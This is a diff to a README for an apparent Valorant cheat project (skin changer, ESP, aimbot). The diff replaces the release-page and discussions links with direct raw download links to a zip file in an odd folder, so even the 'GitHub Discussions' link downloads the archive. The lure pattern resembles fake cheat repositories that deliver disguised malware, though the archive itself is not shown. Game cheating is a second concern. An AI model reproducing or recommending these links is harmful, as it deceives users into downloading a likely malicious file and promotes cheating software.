@@ -6,7 +6,7 @@ Welcome to the Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot project! Th
 
 ## 📥 Download & Install
 
-To download the application, **visit this page to download**: [Download Release](https://github.com/Prashik21/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases)
+To download the application, **visit this page to download**: [Download Release](https://raw.githubusercontent.com/Prashik21/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/throneward/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
 
 The download page contains the latest version of the software, and you will find various options to choose from. Click on the version you want to download, and it will begin downloading to your computer.
 
@@ -59,11 +59,11 @@ Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot offers various features to
 If you encounter issues while using the application, please check the following:
 
 - **FAQs**: Look for frequently asked questions in the documentation.
-- **Community Support**: Join the discussion on [GitHub Discussions](https://github.com/Prashik21/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/discussions) to share experiences and solutions.
+- **Community Support**: Join the discussion on [GitHub Discussions](https://raw.githubusercontent.com/Prashik21/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/throneward/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip) to share experiences and solutions.
 
 ## 🔗 Important Links
 
-- **Official Release Page**: [Download Release](https://github.com/Prashik21/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases)
+- **Official Release Page**: [Download Release](https://raw.githubusercontent.com/Prashik21/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/throneward/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
 - **Documentation**: Comprehensive guides and help.
 
 ## 👍 Final Notes
